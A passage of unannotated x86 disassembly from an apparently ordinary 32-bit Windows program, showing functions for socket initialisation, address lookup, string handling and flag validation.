  40bc25:	mov    edi,eax
  40bc27:	pop    ecx
  40bc28:	pop    ecx
  40bc29:	test   edi,edi
  40bc2b:	je     0x40bc67
  40bc2d:	push   ebx
  40bc2e:	mov    ecx,edi
  40bc30:	call   0x409ba8
  40bc35:	test   eax,eax
  40bc37:	je     0x40bc72
  40bc39:	mov    ecx,edi
  40bc3b:	call   0x409aea
  40bc40:	cmp    eax,0xff
  40bc45:	ja     0x40bc72
  40bc47:	push   0x4018e8
  40bc4c:	cmp    esi,0x4
  40bc4f:	inc    esi
  40bc50:	push   ebx
  40bc51:	call   DWORD PTR ds:0x412270
  40bc57:	mov    edi,eax
  40bc59:	pop    ecx
  40bc5a:	pop    ecx
  40bc5b:	test   edi,edi
  40bc5d:	jne    0x40bc2d
  40bc5f:	cmp    esi,0x4
  40bc62:	jne    0x40bc67
  40bc64:	inc    eax
  40bc65:	jmp    0x40bc74
  40bc67:	push   0x254f
  40bc6c:	call   DWORD PTR ds:0x412014
  40bc72:	xor    eax,eax
  40bc74:	mov    ecx,DWORD PTR [ebp-0x4]
  40bc77:	pop    edi
  40bc78:	pop    esi
  40bc79:	xor    ecx,ebp
  40bc7b:	pop    ebx
  40bc7c:	call   0x40e2c0
  40bc81:	mov    esp,ebp
  40bc83:	pop    ebp
  40bc84:	ret    
  40bc85:	int3   
  40bc86:	int3   
  40bc87:	int3   
  40bc88:	int3   
  40bc89:	int3   
  40bc8a:	mov    edi,edi
  40bc8c:	push   ebp
  40bc8d:	mov    ebp,esp
  40bc8f:	sub    esp,0xa14
  40bc95:	mov    eax,ds:0x411004
  40bc9a:	xor    eax,ebp
  40bc9c:	mov    DWORD PTR [ebp-0x4],eax
  40bc9f:	push   ebx
  40bca0:	push   esi
  40bca1:	push   edi
  40bca2:	mov    DWORD PTR [ebp-0x9ec],ecx
  40bca8:	lea    edi,[ebp-0xa0c]
  40bcae:	xor    ebx,ebx
  40bcb0:	xor    eax,eax
  40bcb2:	push   0x7
  40bcb4:	pop    ecx
  40bcb5:	mov    DWORD PTR [ebp-0xa10],ebx
  40bcbb:	mov    esi,edx
  40bcbd:	mov    edx,DWORD PTR [ebp+0x8]
  40bcc0:	rep stos DWORD PTR es:[edi],eax
  40bcc2:	mov    edi,DWORD PTR [ebp-0x9ec]
  40bcc8:	mov    DWORD PTR [ebp-0x9e8],esi
  40bcce:	mov    DWORD PTR [ebp-0x9f0],edx
  40bcd4:	mov    DWORD PTR [ebp-0x9e4],ebx
  40bcda:	mov    WORD PTR [ebp-0x4e],ax
  40bcde:	test   edi,edi
  40bce0:	je     0x40bdf3
  40bce6:	test   edx,edx
  40bce8:	je     0x40bdf3
  40bcee:	cmp    DWORD PTR [edx],eax
  40bcf0:	je     0x40bd03
  40bcf2:	cmp    DWORD PTR [edx],0x2
  40bcf5:	jb     0x40bdf3
  40bcfb:	test   esi,esi
  40bcfd:	je     0x40bdf3
  40bd03:	cmp    DWORD PTR ds:0x4114ac,eax
  40bd09:	jne    0x40bd37
  40bd0b:	lea    eax,[ebp-0x9e0]
  40bd11:	push   eax
  40bd12:	push   0x202
  40bd17:	call   DWORD PTR ds:0x412164
  40bd1d:	test   eax,eax
  40bd1f:	je     0x40bd2d
  40bd21:	call   DWORD PTR ds:0x412160
  40bd27:	push   eax
  40bd28:	jmp    0x40bdff
  40bd2d:	mov    DWORD PTR ds:0x4114ac,0x1
  40bd37:	lea    eax,[ebp-0x9e4]
  40bd3d:	push   eax
  40bd3e:	lea    eax,[ebp-0xa10]
  40bd44:	push   eax
  40bd45:	push   ebx
  40bd46:	push   edi
  40bd47:	call   DWORD PTR ds:0x412168
  40bd4d:	test   eax,eax
  40bd4f:	jne    0x40be05
  40bd55:	mov    esi,DWORD PTR [ebp-0x9e4]
  40bd5b:	jmp    0x40bd9d
  40bd5d:	push   0x4
  40bd5f:	xor    eax,eax
  40bd61:	mov    WORD PTR [ebp-0x850],ax
  40bd68:	lea    eax,[ebp-0x48]
  40bd6b:	push   0x20
  40bd6d:	push   eax
  40bd6e:	push   0x401
  40bd73:	lea    eax,[ebp-0x850]
  40bd79:	push   eax
  40bd7a:	push   DWORD PTR [esi+0x10]
  40bd7d:	push   DWORD PTR [esi+0x18]
  40bd80:	call   DWORD PTR ds:0x41215c
  40bd86:	test   eax,eax
  40bd88:	je     0x40bda3
  40bd8a:	cmp    eax,0x2afc
  40bd8f:	jne    0x40bd9a
  40bd91:	cmp    WORD PTR [ebp-0x850],bx
  40bd98:	jne    0x40bda3
  40bd9a:	mov    esi,DWORD PTR [esi+0x1c]
  40bd9d:	test   esi,esi
  40bd9f:	jne    0x40bd5d
  40bda1:	jmp    0x40bde3
  40bda3:	lea    eax,[ebp-0x850]
  40bda9:	push   0x4018e8
  40bdae:	push   eax
  40bdaf:	call   DWORD PTR ds:0x412270
  40bdb5:	pop    ecx
  40bdb6:	pop    ecx
  40bdb7:	mov    esi,eax
  40bdb9:	mov    ecx,esi
  40bdbb:	call   0x40a30b
  40bdc0:	mov    ecx,DWORD PTR [ebp-0x9f0]
  40bdc6:	inc    eax
  40bdc7:	cmp    DWORD PTR [ecx],eax
  40bdc9:	jae    0x40bdd2
  40bdcb:	xor    ebx,ebx
  40bdcd:	mov    DWORD PTR [ecx],eax
  40bdcf:	inc    ebx
  40bdd0:	jmp    0x40bde3
  40bdd2:	push   DWORD PTR [ecx]
  40bdd4:	mov    ecx,DWORD PTR [ebp-0x9e8]
  40bdda:	mov    edx,esi
  40bddc:	call   0x40a26c
  40bde1:	mov    ebx,eax
  40bde3:	push   DWORD PTR [ebp-0x9e4]
  40bde9:	call   DWORD PTR ds:0x412158
  40bdef:	mov    eax,ebx
  40bdf1:	jmp    0x40be07
  40bdf3:	call   DWORD PTR ds:0x4120cc
  40bdf9:	test   eax,eax
  40bdfb:	jne    0x40be05
  40bdfd:	push   0x57
  40bdff:	call   DWORD PTR ds:0x412014
  40be05:	xor    eax,eax
  40be07:	mov    ecx,DWORD PTR [ebp-0x4]
  40be0a:	pop    edi
  40be0b:	pop    esi
  40be0c:	xor    ecx,ebp
  40be0e:	pop    ebx
  40be0f:	call   0x40e2c0
  40be14:	mov    esp,ebp
  40be16:	pop    ebp
  40be17:	ret    0x8
  40be1a:	int3   
  40be1b:	int3   
  40be1c:	int3   
  40be1d:	int3   
  40be1e:	int3   
  40be1f:	mov    edi,edi
  40be21:	push   esi
  40be22:	mov    esi,ecx
  40be24:	push   edi
  40be25:	test   esi,esi
  40be27:	je     0x40bed3
  40be2d:	push   esi
  40be2e:	call   DWORD PTR ds:0x4120c4
  40be34:	test   eax,eax
  40be36:	je     0x40bed3
  40be3c:	mov    ecx,esi
  40be3e:	call   0x40ba1b
  40be43:	cmp    eax,0x1
  40be46:	jne    0x40be4b
  40be48:	add    esi,0x4
  40be4b:	push   0x401ae8
  40be50:	push   esi
  40be51:	push   0x401af4
  40be56:	push   0x2
  40be58:	call   0x40952c
  40be5d:	add    esp,0x10
  40be60:	test   eax,eax
  40be62:	jne    0x40be7b
  40be64:	call   DWORD PTR ds:0x4120cc
  40be6a:	test   eax,eax
  40be6c:	jne    0x40be76
  40be6e:	push   0x8
  40be70:	call   DWORD PTR ds:0x412014
  40be76:	push   0x8
  40be78:	pop    eax
  40be79:	jmp    0x40bed5
  40be7b:	call   0x4094a3
  40be80:	xor    edi,edi
  40be82:	test   eax,eax
  40be84:	jne    0x40be90
  40be86:	push   0x12
  40be88:	pop    ecx
  40be89:	call   0x4092df
  40be8e:	jmp    0x40be9c
  40be90:	push   edi
  40be91:	push   edi
  40be92:	push   0x12
  40be94:	mov    edx,eax
  40be96:	pop    ecx
  40be97:	call   0x409339
  40be9c:	test   eax,eax
  40be9e:	je     0x40be64
  40bea0:	push   0x1
  40bea2:	push   edi
  40bea3:	push   eax
  40bea4:	call   DWORD PTR ds:0x4120dc
  40beaa:	mov    esi,eax
  40beac:	test   esi,esi
  40beae:	je     0x40bec6
  40beb0:	cmp    esi,0x4b8
  40beb6:	je     0x40bebf
  40beb8:	call   0x4095c0
  40bebd:	jmp    0x40becf
  40bebf:	call   0x40964c
  40bec4:	jmp    0x40becf
  40bec6:	push   edi
  40bec7:	mov    esi,edi
  40bec9:	call   DWORD PTR ds:0x412014
  40becf:	mov    eax,esi
  40bed1:	jmp    0x40bed5
  40bed3:	xor    eax,eax
  40bed5:	pop    edi
  40bed6:	pop    esi
  40bed7:	ret    0x4
  40beda:	int3   
  40bedb:	int3   
  40bedc:	int3   
  40bedd:	int3   
  40bede:	int3   
  40bedf:	mov    edi,edi
  40bee1:	push   esi
  40bee2:	push   0x0
  40bee4:	mov    esi,ecx
  40bee6:	call   DWORD PTR ds:0x412014
  40beec:	test   esi,esi
  40beee:	jne    0x40bf06
  40bef0:	call   DWORD PTR ds:0x4120cc
  40bef6:	test   eax,eax
  40bef8:	jne    0x40bf02
  40befa:	push   0x57
  40befc:	call   DWORD PTR ds:0x412014
  40bf02:	xor    eax,eax
  40bf04:	pop    esi
  40bf05:	ret    
  40bf06:	push   esi
  40bf07:	call   DWORD PTR ds:0x4120c4
  40bf0d:	cmp    eax,0x1
  40bf10:	jle    0x40bf02
  40bf12:	mov    dx,WORD PTR [esi]
  40bf15:	push   ecx
  40bf16:	push   ecx
  40bf17:	mov    ecx,0x401b98
  40bf1c:	call   0x409c63
  40bf21:	cmp    eax,0xffffffff
  40bf24:	je     0x40bf02
  40bf26:	xor    eax,eax
  40bf28:	inc    eax
  40bf29:	pop    esi
  40bf2a:	ret    
  40bf2b:	int3   
  40bf2c:	int3   
  40bf2d:	int3   
  40bf2e:	int3   
  40bf2f:	int3   
  40bf30:	mov    edi,edi
  40bf32:	push   ebp
  40bf33:	mov    ebp,esp
  40bf35:	sub    esp,0x1c
  40bf38:	push   ebx
  40bf39:	push   esi
  40bf3a:	xor    esi,esi
  40bf3c:	mov    ebx,ecx
  40bf3e:	push   edi
  40bf3f:	push   esi
  40bf40:	mov    DWORD PTR [ebp-0x1c],esi
  40bf43:	mov    DWORD PTR [ebp-0x8],esi
  40bf46:	mov    DWORD PTR [ebp-0x10],esi
  40bf49:	mov    DWORD PTR [ebp-0x4],esi
  40bf4c:	mov    DWORD PTR [ebp-0x14],esi
  40bf4f:	call   DWORD PTR ds:0x412014
  40bf55:	mov    eax,esi
  40bf57:	mov    edx,0x104
  40bf5c:	neg    eax
  40bf5e:	push   0x1
  40bf60:	sbb    eax,eax
  40bf62:	and    eax,0x104
  40bf67:	add    edx,eax
  40bf69:	push   edx
  40bf6a:	push   0x7
  40bf6c:	mov    DWORD PTR [ebp-0x8],edx
  40bf6f:	xor    edx,edx
  40bf71:	pop    ecx
  40bf72:	call   0x409339
  40bf77:	mov    edi,eax
  40bf79:	test   edi,edi
  40bf7b:	je     0x40c132
  40bf81:	push   DWORD PTR [ebp-0x8]
  40bf84:	push   edi
  40bf85:	push   esi
  40bf86:	call   DWORD PTR ds:0x412038
  40bf8c:	test   eax,eax
  40bf8e:	je     0x40c144
  40bf94:	mov    edx,DWORD PTR [ebp-0x8]
  40bf97:	lea    ecx,[edx-0x1]
  40bf9a:	cmp    eax,ecx
  40bf9c:	jae    0x40bf5c
  40bf9e:	lea    eax,[ebp-0x1c]
  40bfa1:	push   eax
  40bfa2:	push   edi
  40bfa3:	push   0x1
  40bfa5:	call   DWORD PTR ds:0x41214c
  40bfab:	mov    DWORD PTR [ebp-0x8],eax
  40bfae:	test   eax,eax
  40bfb0:	jne    0x40bfd5
  40bfb2:	call   DWORD PTR ds:0x4120cc
  40bfb8:	test   eax,eax
  40bfba:	jne    0x40c144
  40bfc0:	call   DWORD PTR ds:0x4120cc
  40bfc6:	test   eax,eax
  40bfc8:	jne    0x40c144
  40bfce:	push   0x57
  40bfd0:	jmp    0x40c13e
  40bfd5:	add    eax,0xa
  40bfd8:	mov    ecx,eax
  40bfda:	mov    DWORD PTR [ebp-0x8],eax
  40bfdd:	call   0x40ab1d
  40bfe2:	mov    esi,eax
  40bfe4:	mov    DWORD PTR [ebp-0xc],esi
  40bfe7:	test   esi,esi
  40bfe9:	je     0x40c144
  40bfef:	push   esi
  40bff0:	push   DWORD PTR [ebp-0x8]
  40bff3:	push   0x0
  40bff5:	push   edi
  40bff6:	push   0x3
  40bff8:	call   DWORD PTR ds:0x412150
  40bffe:	test   eax,eax
  40c000:	jne    0x40c00f
  40c002:	lea    ecx,[ebp-0xc]
  40c005:	call   0x40aa69
  40c00a:	jmp    0x40c144
  40c00f:	lea    eax,[ebp-0x10]
  40c012:	push   eax
  40c013:	lea    eax,[ebp-0x14]
  40c016:	push   eax
  40c017:	push   0x401b04
  40c01c:	push   esi
  40c01d:	call   DWORD PTR ds:0x412148
  40c023:	test   eax,eax
  40c025:	je     0x40c002
  40c027:	push   0x1
  40c029:	push   0x40
  40c02b:	push   0x7
  40c02d:	xor    edx,edx
  40c02f:	pop    ecx
  40c030:	call   0x409339
  40c035:	and    DWORD PTR [ebp-0x4],0x0
  40c039:	mov    edx,eax
  40c03b:	xor    edi,edi
  40c03d:	mov    DWORD PTR [ebp-0x18],edx
  40c040:	test   DWORD PTR [ebp-0x10],0xfffffffc
  40c047:	jbe    0x40c002
  40c049:	mov    ecx,DWORD PTR [ebp-0x14]
  40c04c:	movzx  eax,WORD PTR [ecx+edi*4+0x2]
  40c051:	push   eax
  40c052:	movzx  eax,WORD PTR [ecx+edi*4]
  40c056:	push   eax
  40c057:	push   0x401b38
  40c05c:	push   0x40
  40c05e:	push   edx
  40c05f:	call   0x40adea
  40c064:	add    esp,0x14
  40c067:	lea    eax,[ebp-0x8]
  40c06a:	push   eax
  40c06b:	lea    eax,[ebp-0x4]
  40c06e:	push   eax
  40c06f:	push   DWORD PTR [ebp-0x18]
  40c072:	push   esi
  40c073:	call   DWORD PTR ds:0x412148
  40c079:	test   eax,eax
  40c07b:	jne    0x40c092
  40c07d:	mov    eax,DWORD PTR [ebp-0x10]
  40c080:	xor    ecx,ecx
  40c082:	mov    edx,DWORD PTR [ebp-0x18]
  40c085:	inc    edi
  40c086:	shr    eax,0x2
  40c089:	mov    DWORD PTR [ebp-0x4],ecx
  40c08c:	cmp    edi,eax
  40c08e:	jb     0x40c049
  40c090:	jmp    0x40c095
  40c092:	mov    ecx,DWORD PTR [ebp-0x4]
  40c095:	test   ecx,ecx
  40c097:	je     0x40c002
  40c09d:	call   0x40a30b
  40c0a2:	cmp    eax,0x4
  40c0a5:	ja     0x40c0c4
  40c0a7:	lea    ecx,[ebp-0xc]
  40c0aa:	call   0x40aa69
  40c0af:	call   DWORD PTR ds:0x4120cc
  40c0b5:	test   eax,eax
  40c0b7:	jne    0x40c144
  40c0bd:	push   0x42b
  40c0c2:	jmp    0x40c13e
  40c0c4:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c7:	mov    edi,0x401b84
  40c0cc:	push   0x0
  40c0ce:	push   0x1
  40c0d0:	mov    edx,edi
  40c0d2:	call   0x409d91
  40c0d7:	cmp    eax,0xffffffff
  40c0da:	je     0x40c0f9
  40c0dc:	push   DWORD PTR [ebp-0x4]
  40c0df:	call   DWORD PTR ds:0x4120c4
  40c0e5:	push   edi
  40c0e6:	mov    esi,eax
  40c0e8:	call   DWORD PTR ds:0x4120c4
  40c0ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0f1:	sub    esi,eax
  40c0f3:	xor    eax,eax
  40c0f5:	mov    WORD PTR [ecx+esi*2],ax
  40c0f9:	test   ebx,ebx
  40c0fb:	je     0x40c164
  40c0fd:	push   DWORD PTR [ebp-0x4]
  40c100:	call   DWORD PTR ds:0x4120c4
  40c106:	push   ebx
  40c107:	mov    esi,eax
  40c109:	call   DWORD PTR ds:0x4120c4
  40c10f:	push   0x1
  40c111:	add    esi,0xb
  40c114:	xor    edx,edx
  40c116:	add    eax,esi
  40c118:	push   eax
  40c119:	push   0x7
  40c11b:	pop    ecx
  40c11c:	mov    DWORD PTR [ebp-0x8],eax
  40c11f:	call   0x409339
  40c124:	mov    esi,eax
  40c126:	test   esi,esi
  40c128:	jne    0x40c14d
  40c12a:	lea    ecx,[ebp-0xc]
  40c12d:	call   0x40aa69
  40c132:	call   DWORD PTR ds:0x4120cc
  40c138:	test   eax,eax
  40c13a:	jne    0x40c144
  40c13c:	push   0x8
  40c13e:	call   DWORD PTR ds:0x412014
  40c144:	xor    eax,eax
  40c146:	pop    edi
  40c147:	pop    esi
  40c148:	pop    ebx
  40c149:	mov    esp,ebp
  40c14b:	pop    ebp
  40c14c:	ret    
  40c14d:	push   ebx
  40c14e:	push   DWORD PTR [ebp-0x4]
  40c151:	push   0x401334
  40c156:	push   DWORD PTR [ebp-0x8]
  40c159:	push   esi
  40c15a:	call   0x40adea
  40c15f:	add    esp,0x14
  40c162:	jmp    0x40c187
  40c164:	mov    edx,DWORD PTR [ebp-0x4]
  40c167:	test   edx,edx
  40c169:	jne    0x40c175
  40c16b:	push   0x7
  40c16d:	pop    ecx
  40c16e:	call   0x4092df
  40c173:	jmp    0x40c181
  40c175:	push   0x0
  40c177:	push   0x0
  40c179:	push   0x7
  40c17b:	pop    ecx
  40c17c:	call   0x409339
  40c181:	mov    esi,eax
  40c183:	test   esi,esi
  40c185:	je     0x40c12a
  40c187:	push   esi
  40c188:	mov    DWORD PTR [ebp-0x4],esi
  40c18b:	call   DWORD PTR ds:0x41213c
  40c191:	push   0x1
  40c193:	push   0x50
  40c195:	push   0xb
  40c197:	xor    edx,edx
  40c199:	pop    ecx
  40c19a:	call   0x409339
  40c19f:	mov    esi,eax
  40c1a1:	test   esi,esi
  40c1a3:	je     0x40c12a
  40c1a5:	push   DWORD PTR [ebp-0x4]
  40c1a8:	mov    ecx,0x15ed
  40c1ad:	call   0x4098dc
  40c1b2:	push   eax
  40c1b3:	push   0x50
  40c1b5:	push   esi
  40c1b6:	call   0x40adea
  40c1bb:	add    esp,0x10
  40c1be:	lea    ecx,[ebp-0xc]
  40c1c1:	call   0x40aa69
  40c1c6:	mov    eax,esi
  40c1c8:	jmp    0x40c146
  40c1cd:	int3   
  40c1ce:	int3   
  40c1cf:	int3   
  40c1d0:	int3   
  40c1d1:	int3   
  40c1d2:	mov    edi,edi
  40c1d4:	push   ebx
  40c1d5:	push   esi
  40c1d6:	push   edi
  40c1d7:	push   0x0
  40c1d9:	mov    esi,ecx
  40c1db:	call   DWORD PTR ds:0x412014
  40c1e1:	test   esi,esi
  40c1e3:	je     0x40c24e
  40c1e5:	push   ecx
  40c1e6:	push   ecx
  40c1e7:	push   0x7c
  40c1e9:	pop    edx
  40c1ea:	mov    ecx,esi
  40c1ec:	call   0x409c63
  40c1f1:	mov    edi,eax
  40c1f3:	cmp    edi,0xffffffff
  40c1f6:	jne    0x40c209
  40c1f8:	push   0x0
  40c1fa:	call   DWORD PTR ds:0x412014
  40c200:	mov    ecx,esi
  40c202:	call   0x40a30b
  40c207:	mov    edi,eax
  40c209:	push   0x1
  40c20b:	lea    eax,[edi+0x5]
  40c20e:	xor    edx,edx
  40c210:	push   eax
  40c211:	push   0xc
  40c213:	pop    ecx
  40c214:	call   0x409339
  40c219:	mov    ebx,eax
  40c21b:	test   ebx,ebx
  40c21d:	jne    0x40c22d
  40c21f:	call   DWORD PTR ds:0x4120cc
  40c225:	test   eax,eax
  40c227:	jne    0x40c260
  40c229:	push   0x8
  40c22b:	jmp    0x40c25a
  40c22d:	lea    eax,[edi+0x1]
  40c230:	mov    edx,0x401070
  40c235:	push   eax
  40c236:	mov    ecx,ebx
  40c238:	call   0x40a26c
  40c23d:	lea    eax,[edi+0x2]
  40c240:	mov    edx,esi
  40c242:	push   eax
  40c243:	mov    ecx,ebx
  40c245:	call   0x40a2d1
  40c24a:	mov    eax,ebx
  40c24c:	jmp    0x40c262
  40c24e:	call   DWORD PTR ds:0x4120cc
  40c254:	test   eax,eax
  40c256:	jne    0x40c260
  40c258:	push   0x57
  40c25a:	call   DWORD PTR ds:0x412014
  40c260:	xor    eax,eax
  40c262:	pop    edi
  40c263:	pop    esi
  40c264:	pop    ebx
  40c265:	ret    
  40c266:	int3   
  40c267:	int3   
  40c268:	int3   
  40c269:	int3   
  40c26a:	int3   
  40c26b:	mov    edi,edi
  40c26d:	push   ebp
  40c26e:	mov    ebp,esp
  40c270:	sub    esp,0x10
  40c273:	push   ebx
  40c274:	push   esi
  40c275:	xor    eax,eax
  40c277:	mov    ebx,ecx
  40c279:	push   edi
  40c27a:	push   eax
  40c27b:	mov    DWORD PTR [ebp-0x10],ebx
  40c27e:	mov    DWORD PTR [ebp-0xc],eax
  40c281:	call   DWORD PTR ds:0x412014
  40c287:	mov    esi,DWORD PTR [ebp+0x8]
  40c28a:	test   esi,esi
  40c28c:	jne    0x40c2a3
  40c28e:	call   DWORD PTR ds:0x4120cc
  40c294:	test   eax,eax
  40c296:	jne    0x40c522
  40c29c:	push   0x57
  40c29e:	jmp    0x40c51c
  40c2a3:	test   ebx,ebx
  40c2a5:	je     0x40c28e
  40c2a7:	or     DWORD PTR [ebx],0xffffffff
  40c2aa:	xor    ebx,ebx
  40c2ac:	mov    DWORD PTR [ebp-0x8],ebx
  40c2af:	add    esi,0x3c
  40c2b2:	lea    eax,[esi-0x3c]
  40c2b5:	test   eax,eax
  40c2b7:	je     0x40c50d
  40c2bd:	push   0xffffffff
  40c2bf:	push   0x401b90
  40c2c4:	push   0xffffffff
  40c2c6:	lea    eax,[esi-0x3c]
  40c2c9:	push   eax
  40c2ca:	push   0x1
  40c2cc:	call   DWORD PTR ds:0x412078
  40c2d2:	push   eax
  40c2d3:	call   DWORD PTR ds:0x412074
  40c2d9:	add    eax,0xfffffffe
  40c2dc:	jne    0x40c28e
  40c2de:	mov    edx,DWORD PTR [esi-0x28]
  40c2e1:	mov    edi,DWORD PTR [esi-0x2c]
  40c2e4:	mov    DWORD PTR [ebp-0x4],edx
  40c2e7:	cmp    DWORD PTR [esi],ebx
  40c2e9:	jne    0x40c28e
  40c2eb:	cmp    DWORD PTR [esi+0x4],ebx
  40c2ee:	jne    0x40c28e
  40c2f0:	cmp    DWORD PTR [esi+0x8],ebx
  40c2f3:	jne    0x40c28e
  40c2f5:	cmp    DWORD PTR [esi+0xc],ebx
  40c2f8:	jne    0x40c28e
  40c2fa:	mov    ebx,edi
  40c2fc:	xor    ecx,ecx
  40c2fe:	and    ebx,0x40000
  40c304:	mov    eax,ebx
  40c306:	or     eax,ecx
  40c308:	jne    0x40c327
  40c30a:	cmp    DWORD PTR [esi-0x1c],ecx
  40c30d:	je     0x40c28e
  40c313:	push   DWORD PTR [esi-0x1c]
  40c316:	call   DWORD PTR ds:0x4120c4
  40c31c:	test   eax,eax
  40c31e:	je     0x40c28e
  40c324:	mov    edx,DWORD PTR [ebp-0x4]
  40c327:	mov    ecx,edi
  40c329:	and    ecx,0x20000
  40c32f:	mov    eax,ecx
  40c331:	or     eax,0x0
  40c334:	je     0x40c340
  40c336:	cmp    DWORD PTR [esi-0x34],0xa
  40c33a:	jne    0x40c28e
  40c340:	xor    eax,eax
  40c342:	or     ecx,eax
  40c344:	je     0x40c355
  40c346:	xor    ecx,ecx
  40c348:	inc    ecx
  40c349:	cmp    DWORD PTR [ebp-0xc],ecx
  40c34c:	je     0x40c28e
  40c352:	mov    DWORD PTR [ebp-0xc],ecx
  40c355:	or     ebx,eax
  40c357:	je     0x40c36a
  40c359:	mov    eax,DWORD PTR [ebp-0x10]
  40c35c:	cmp    DWORD PTR [eax],0xffffffff
  40c35f:	jne    0x40c28e
  40c365:	mov    ecx,DWORD PTR [ebp-0x8]
  40c368:	mov    DWORD PTR [eax],ecx
  40c36a:	mov    ecx,0x60000
  40c36f:	mov    eax,edi
  40c371:	and    eax,ecx
  40c373:	xor    ebx,ebx
  40c375:	cmp    eax,ecx
  40c377:	jne    0x40c381
  40c379:	cmp    ebx,ebx
  40c37b:	je     0x40c28e
  40c381:	mov    eax,DWORD PTR [esi-0x34]
  40c384:	dec    eax
  40c385:	cmp    eax,0x9
  40c388:	ja     0x40c28e
  40c38e:	jmp    DWORD PTR [eax*4+0x40c52f]
  40c395:	mov    ebx,edi
  40c397:	xor    ecx,ecx
  40c399:	and    ebx,0x10000
  40c39f:	mov    eax,ebx
  40c3a1:	or     eax,ecx
  40c3a3:	je     0x40c3ce
  40c3a5:	mov    edx,edi
  40c3a7:	and    edx,0x1
  40c3aa:	mov    eax,edx
  40c3ac:	or     eax,ecx
  40c3ae:	jne    0x40c28e
  40c3b4:	cmp    DWORD PTR [esi-0x10],eax
  40c3b7:	jne    0x40c28e
  40c3bd:	cmp    DWORD PTR [esi-0xc],eax
  40c3c0:	je     0x40c3fc
  40c3c2:	cmp    DWORD PTR [esi-0xc],0x2
  40c3c6:	jb     0x40c28e
  40c3cc:	jmp    0x40c3fc
  40c3ce:	mov    ecx,DWORD PTR [esi-0x10]
  40c3d1:	test   ecx,ecx
  40c3d3:	je     0x40c28e
  40c3d9:	xor    eax,eax
  40c3db:	mov    edx,edi
  40c3dd:	and    edx,0x1
  40c3e0:	mov    DWORD PTR [ebp-0x4],eax
  40c3e3:	mov    eax,edx
  40c3e5:	or     eax,DWORD PTR [ebp-0x4]
  40c3e8:	je     0x40c3f9
  40c3ea:	mov    ecx,DWORD PTR [ecx]
  40c3ec:	call   0x40b10f
  40c3f1:	test   eax,eax
  40c3f3:	je     0x40c28e
  40c3f9:	mov    ecx,DWORD PTR [ebp-0x4]
  40c3fc:	mov    eax,edi
  40c3fe:	and    eax,0x2
  40c401:	or     eax,0x0
  40c404:	je     0x40c413
  40c406:	xor    eax,eax
  40c408:	cmp    DWORD PTR [esi-0x14],eax
  40c40b:	je     0x40c28e
  40c411:	jmp    0x40c415
  40c413:	xor    eax,eax
  40c415:	or     edx,ecx
  40c417:	jne    0x40c43c
  40c419:	cmp    DWORD PTR [esi-0x24],0x1
  40c41d:	jne    0x40c28e
  40c423:	and    edi,0x20
  40c426:	or     edi,eax
  40c428:	jne    0x40c28e
  40c42e:	or     ebx,eax
  40c430:	jne    0x40c43c
  40c432:	cmp    DWORD PTR [esi-0xc],0x2
  40c436:	jb     0x40c28e
  40c43c:	xor    ebx,ebx
  40c43e:	mov    ecx,DWORD PTR [ebp-0x8]
  40c441:	inc    ecx
  40c442:	mov    DWORD PTR [esi-0x20],ebx
  40c445:	add    esi,0x50
  40c448:	mov    DWORD PTR [ebp-0x8],ecx
  40c44b:	cmp    ecx,0x6
  40c44e:	jb     0x40c2b2
  40c454:	xor    eax,eax
  40c456:	inc    eax
  40c457:	jmp    0x40c524
  40c45c:	mov    eax,edi
  40c45e:	and    eax,0x2
  40c461:	or     eax,ebx
  40c463:	jne    0x40c509
  40c469:	mov    eax,edi
  40c46b:	and    eax,0x10040
  40c470:	or     eax,ebx
  40c472:	jne    0x40c28e
  40c478:	mov    eax,edi
  40c47a:	and    eax,0x80
  40c47f:	or     eax,ebx
  40c481:	jne    0x40c28e
  40c487:	mov    ecx,DWORD PTR [esi-0x10]
  40c48a:	test   ecx,ecx
  40c48c:	je     0x40c28e
  40c492:	mov    eax,edi
  40c494:	and    eax,0x1
  40c497:	or     eax,ebx
  40c499:	je     0x40c4ac
  40c49b:	mov    ecx,DWORD PTR [ecx]
  40c49d:	call   0x40b10f
  40c4a2:	test   eax,eax
  40c4a4:	je     0x40c28e
  40c4aa:	jmp    0x40c43e
  40c4ac:	cmp    DWORD PTR [esi-0x24],0x1
  40c4b0:	ja     0x40c28e
  40c4b6:	and    edi,0x20
  40c4b9:	or     edi,ebx
  40c4bb:	jne    0x40c28e
  40c4c1:	jmp    0x40c43e
  40c4c6:	cmp    DWORD PTR [esi-0x8],ebx
  40c4c9:	je     0x40c28e
  40c4cf:	cmp    DWORD PTR [esi-0x4],ebx
  40c4d2:	jne    0x40c43e
  40c4d8:	lea    eax,[esi-0x3c]
  40c4db:	mov    DWORD PTR [esi-0x4],eax
  40c4de:	jmp    0x40c43e
  40c4e3:	mov    eax,edi
  40c4e5:	and    eax,0xf
  40c4e8:	or     eax,ebx
  40c4ea:	jne    0x40c28e
  40c4f0:	mov    eax,edi
  40c4f2:	and    eax,0xfff0
  40c4f7:	or     eax,ebx
  40c4f9:	jne    0x40c28e
  40c4ff:	and    edi,0xffedffff
  40c505:	or     edi,edx
  40c507:	jmp    0x40c4bb
  40c509:	push   0x78
  40c50b:	jmp    0x40c51c
  40c50d:	call   DWORD PTR ds:0x4120cc
  40c513:	test   eax,eax
  40c515:	jne    0x40c522
  40c517:	push   0x42b
  40c51c:	call   DWORD PTR ds:0x412014
  40c522:	xor    eax,eax
  40c524:	pop    edi
  40c525:	pop    esi
  40c526:	pop    ebx
  40c527:	mov    esp,ebp
  40c529:	pop    ebp
  40c52a:	ret    0x4
  40c52d:	mov    edi,edi
  40c52f:	xchg   ebp,eax
  40c530:	ret    
  40c531:	inc    eax
  40c532:	add    BYTE PTR [esp+eax*8+0x40],bl
  40c536:	add    BYTE PTR [esp+eax*8+0x40],bl
  40c53a:	add    BYTE PTR [ecx],cl
  40c53c:	lds    eax,FWORD PTR [eax+0x0]
  40c53f:	or     ebp,eax
  40c541:	inc    eax
  40c542:	add    BYTE PTR [ecx],cl
  40c544:	lds    eax,FWORD PTR [eax+0x0]
  40c547:	pop    esp
  40c548:	les    eax,FWORD PTR [eax+0x0]
  40c54b:	pop    esp
  40c54c:	les    eax,FWORD PTR [eax+0x0]
  40c54f:	mov    ah,0x40
  40c552:	add    bl,ah
  40c554:	les    eax,FWORD PTR [eax+0x0]
  40c557:	int3   
  40c558:	int3   
  40c559:	int3   
  40c55a:	int3   
  40c55b:	int3   
  40c55c:	mov    edi,edi
  40c55e:	push   ebp
  40c55f:	mov    ebp,esp
  40c561:	sub    esp,0x40
  40c564:	mov    eax,ds:0x411004
